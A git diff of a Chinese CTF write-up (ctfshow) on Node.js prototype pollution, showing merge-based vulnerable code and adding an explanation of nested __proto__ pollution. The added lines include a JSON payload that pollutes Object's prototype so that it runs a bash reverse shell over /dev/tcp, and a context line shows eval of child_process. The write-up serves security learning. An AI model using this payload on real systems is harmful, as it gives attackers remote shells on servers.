@@ -70,7 +70,7 @@ eval(require("child_process").execSync('ls'))
 ```
  var secert = {};
  let user = {};
- utils.copy(user,req.body);  //这里的copy类似merge函数
+ utils.copy(user,req.body);  //这里的copy类似merge函数。req.body是入口
   if(secert.ctfshow==='36dboy'){
     res.end(flag);
   }
@@ -144,17 +144,24 @@ function copy(object1, object2){
 ^
 **继承的继承场景**
 ```
-  var user = new function(){
+ var user = new function(){
     this.userinfo = new function(){
     this.isVIP = false;
     this.isAdmin = false;
     this.isAuthor = false;     
     };
   }
-  utils.copy(user.userinfo,req.body);
-  if(user.userinfo.isAdmin){
+ utils.copy(user.userinfo,req.body);
+ if(user.userinfo.isAdmin){
    res.end(flag);
   }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'});  
   }
 ```
+req.body是入口，user.userinfo我们要通过这个污染Object,`userinfo` 的原型不是 `Object` 对象， `userinfo.__proto__.__proto__` 才是 `Object` 对象。
+于是
+```
+{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/IP/端口 0>&1\"')"}}
+```
+
+
